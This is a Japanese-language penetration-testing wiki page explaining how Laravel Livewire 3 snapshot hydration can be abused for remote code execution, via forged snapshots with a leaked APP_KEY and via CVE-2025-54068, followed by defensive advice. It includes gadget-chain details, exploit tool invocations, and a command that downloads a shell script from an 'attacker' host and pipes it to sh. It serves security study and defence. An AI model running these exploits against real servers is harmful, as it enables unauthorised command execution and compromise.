# Laravel Livewire Hydration & Synthesizer Abuse

{{#include ../../banners/hacktricks-training.md}}

## Livewire ステートマシンの要約

Livewire 3 コンポーネントは、`data`、`memo`、および checksum を含む **snapshots** を介して状態をやり取りします。`/livewire/update` への各 POST は JSON スナップショットをサーバー側で再ハイドレートし、キューに入った `calls`/`updates` を実行します。
```php
class Checksum {
static function verify($snapshot) {
$checksum = $snapshot['checksum'];
unset($snapshot['checksum']);
if ($checksum !== self::generate($snapshot)) {
throw new CorruptComponentPayloadException;
}
}

static function generate($snapshot) {
return hash_hmac('sha256', json_encode($snapshot), $hashKey);
}
}
```
`APP_KEY`（`$hashKey` を導出するために使われる）を保持している者は、HMAC を再計算することで任意のスナップショットを偽造できる。

複雑なプロパティは、`Livewire\Drawer\BaseUtils::isSyntheticTuple()` で検出される **synthetic tuples** としてエンコードされる; 各タプルは `[value, {"s":"<key>", ...meta}]` である。ハイドレーションコアは各タプルを `HandleComponents::$propertySynthesizers` で選択された synth に単に委譲し、子要素へ再帰する:
```php
protected function hydrate($valueOrTuple, $context, $path)
{
if (! Utils::isSyntheticTuple($value = $tuple = $valueOrTuple)) return $value;
[$value, $meta] = $tuple;
$synth = $this->propertySynth($meta['s'], $context, $path);
return $synth->hydrate($value, $meta, fn ($name, $child)
=> $this->hydrate($child, $context, "{$path}.{$name}"));
}
```
この再帰的な設計により、攻撃者がタプルのメタデータか再帰中に処理される任意のネストされたタプルを制御すると、Livewire は **汎用的なオブジェクト生成エンジン** になります。

## Synthesizers that grant gadget primitives

| Synthesizer | Attacker-controlled behaviour |
|-------------|--------------------------------|
| **CollectionSynth (`clctn`)** | 各子を再ハイドレートした後に `new $meta['class']($value)` をインスタンス化します。配列を受け取るコンストラクタを持つ任意のクラスを作成でき、各アイテム自体が合成タプルであり得ます。 |
| **FormObjectSynth (`form`)** | `new $meta['class']($component, $path)` を呼び出し、その後攻撃者制御の子から `$hydrateChild` を介して全ての public プロパティを代入します。2つの緩く型付けされたパラメータ（またはデフォルト引数）を受け取るコンストラクタがあれば任意の public プロパティに到達できます。 |
| **ModelSynth (`mdl`)** | meta から `key` が欠けていると `return new $class;` を実行し、攻撃者が制御する任意のクラスを引数無しでインスタンス化できます。 |

`$hydrateChild` を全てのネスト要素で呼び出すため、タプルを再帰的に積み重ねることで任意のガジェットグラフを構築できます。

## Forging snapshots when `APP_KEY` is known

1. 正当な `/livewire/update` リクエストをキャプチャし、`components[0].snapshot` をデコードします。
2. ガジェットクラスを指すネストされたタプルを注入し、`checksum = hash_hmac('sha256', json_encode(snapshot_without_checksum), APP_KEY)` を再計算します。
3. スナップショットを再エンコードし、`_token`/`memo` はそのままにしてリクエストをリプレイします。

最小の実行証明は **Guzzle's `FnStream`** と **Flysystem's `ShardedPrefixPublicUrlGenerator`** を使用します。1つのタプルがコンストラクタデータ `{ "__toString": "phpinfo" }` で `FnStream` をインスタンス化し、次のタプルが `[FnStreamInstance]` を `$prefixes` として `ShardedPrefixPublicUrlGenerator` をインスタンス化します。Flysystem が各 prefix を `string` にキャストすると、PHP は攻撃者提供の `__toString` callable を呼び出し、引数なしで任意の関数を実行します。

### From function calls to full RCE

Livewire のインスタンス化プリミティブを利用して、Synacktiv は phpggc の `Laravel/RCE4` チェーンを適応させ、ハイドレーションが public な Queueable 状態を持つオブジェクトを起動してデシリアライズを引き起こすようにしました:

1. **Queueable trait** – `Illuminate\Bus\Queueable` を使用する任意のオブジェクトは public `$chained` を公開し、`dispatchNextJobInChain()` 内で `unserialize(array_shift($this->chained))` を実行します。
2. **BroadcastEvent wrapper** – `Illuminate\Broadcasting\BroadcastEvent` (ShouldQueue) は `CollectionSynth` / `FormObjectSynth` を介してインスタンス化され、public `$chained` が設定されます。
3. **phpggc Laravel/RCE4Adapted** – `$chained[0]` に格納されたシリアライズ済みのバイナリは `PendingBroadcast -> Validator -> SerializableClosure\Serializers\Signed` を構築します。`Signed::__invoke()` は最終的に `call_user_func_array($closure, $args)` を呼び出し、`system($cmd)` を可能にします。
4. **Stealth termination** – `[new Laravel\Prompts\Terminal(), 'exit']` のような第2の `FnStream` callable を渡すことで、リクエストは騒がしい例外の代わりに `exit()` で終了し、HTTP レスポンスをクリーンに保ちます。

### Automating snapshot forgery

`synacktiv/laravel-crypto-killer` は現在、全てを結合する `livewire` モードを搭載しています:
```bash
./laravel_crypto_killer.py exploit -e livewire -k base64:APP_KEY \
-j request.json --function system -p "bash -c 'id'"
```
ツールはキャプチャしたスナップショットを解析し、gadget tuples を注入してチェックサムを再計算し、送信準備が整った `/livewire/update` ペイロードを出力します。

## CVE-2025-54068 – `APP_KEY`なしでの RCE

ベンダーのアドバイザリによると、本件は Livewire v3 (>= 3.0.0-beta.1 and < 3.6.3) に影響し、v3 固有の問題です。

`updates` はスナップショットのチェックサムが検証された**後**にコンポーネントの状態にマージされます。スナップショット内のプロパティが（またはそうなった場合）synthetic tuple であると、Livewire は攻撃者が制御する update 値をハイドレートする際にその meta を再利用します：
```php
protected function hydrateForUpdate($raw, $path, $value, $context)
{
$meta = $this->getMetaForPath($raw, $path);
if ($meta) {
return $this->hydrate([$value, $meta], $context, $path);
}
}
```
Exploit recipe:

1. 型指定されていない public プロパティ（例: `public $count;`）を持つ Livewire コンポーネントを見つける。
2. そのプロパティを `[]` に設定する update を送る。次のスナップショットではそれが `[[], {"s": "arr"}]` として保存される。

A minimal type-juggling flow looks like this:

```http
POST /livewire/update
...
"updates": {"count": []}
```

Then the next snapshot stores a tuple that keeps the `arr` synthesizer metadata:

```json
"count": [[], {"s": "arr"}]
```

3. そのプロパティが深くネストされた配列を含み、タプル（例: `[ <payload>, {"s":"clctn","class":"GuzzleHttp\\Psr7\\FnStream"} ]`）を埋め込むような別の `updates` ペイロードを作成する。
4. 再帰処理中、`hydrate()` は各ネストされた子要素を個別に評価するため、外側のタプルとチェックサムが変わっていなくても、攻撃者が選んだ synth キー/クラスが尊重される。
5. 同じ `CollectionSynth`/`FormObjectSynth` のプリミティブを再利用して、`$chained[0]` に phpggc ペイロードを含む Queueable ガジェットをインスタンス化する。Livewire は偽造された updates を処理し、`dispatchNextJobInChain()` を呼び出し、`APP_KEY` を知らないまま `system(<cmd>)` に到達する。

Key reasons this works:

- `updates` はスナップショットのチェックサムの対象外である。
- `getMetaForPath()` は、そのプロパティが弱い型付けにより攻撃者によってタプルにされたとしても、既に存在している synth メタデータを信用する。
- 再帰処理と弱い型付けにより、それぞれのネストされた配列が新しいタプルとして解釈されるため、任意の synth キーや任意のクラスが最終的に hydration に到達する。

## Livepyre – エンドツーエンドの悪用

[Livepyre](https://github.com/synacktiv/Livepyre) は APP_KEY-less CVE と signed-snapshot パスの両方の経路を自動化する：

- デプロイされている Livewire のバージョンを `<script src="/livewire/livewire.js?id=HASH">` を解析してフィンガープリントし、ハッシュを脆弱なリリースにマッピングする。
- 正規の操作を再生して `components[].snapshot` を抽出し、ベースラインのスナップショットを収集する。
- `updates` のみのペイロード（CVE-2025-54068）または phpggc チェーンを埋め込んだ偽造スナップショット（既知の APP_KEY）を生成する。
- スナップショット内に object 型のパラメータが見つからない場合、Livepyre は強制可能なプロパティに到達するために候補パラメータを総当たりで試すフェールバックを行う。

Typical usage:
```bash
# CVE-2025-54068, unauthenticated
python3 Livepyre.py -u https://target/livewire/component -f system -p id

# Signed snapshot exploit with known APP_KEY
python3 Livepyre.py -u https://target/livewire/component -a base64:APP_KEY \
-f system -p "bash -c 'curl attacker/shell.sh|sh'"
```
`-c/--check` は非破壊的なプローブを実行し、`-F` はバージョンゲーティングをスキップし、`-H` と `-P` はカスタムヘッダやプロキシを追加し、`--function/--param` は gadget chain で呼び出される php 関数をカスタマイズします。

## 防御上の考慮事項

- ベンダーの公表によれば修正済みの Livewire ビルド（>= 3.6.4）にアップグレードし、CVE-2025-54068 のベンダーパッチを適用してください。
- Livewire コンポーネントでは weakly typed な public properties を避ける。明示的な scalar types はプロパティ値が arrays/tuples に強制されるのを防ぎます。
- 本当に必要な synthesizers のみを登録し、ユーザ制御のメタデータ（`$meta['class']`）は信頼できないものとして扱ってください。
- プロパティの JSON 型を変更する更新（例: scalar -> array）は明示的に許可されていない限り拒否し、古い tuples を再利用せずに synth metadata を再導出してください。
- `APP_KEY` は開示後速やかにローテーションしてください。コードベースがどれだけパッチされていても、これがあればオフライン snapshot forging が可能になります。

## References

- [Synacktiv – Livewire: Remote Command Execution via Unmarshaling](https://www.synacktiv.com/publications/livewire-execution-de-commandes-a-distance-via-unmarshaling.html)
- [synacktiv/laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer)
- [synacktiv/Livepyre](https://github.com/synacktiv/Livepyre)
- [GHSA-29cq-5w36-x7w3 – Livewire v3 RCE advisory](https://github.com/livewire/livewire/security/advisories/GHSA-29cq-5w36-x7w3)

{{#include ../../banners/hacktricks-training.md}}
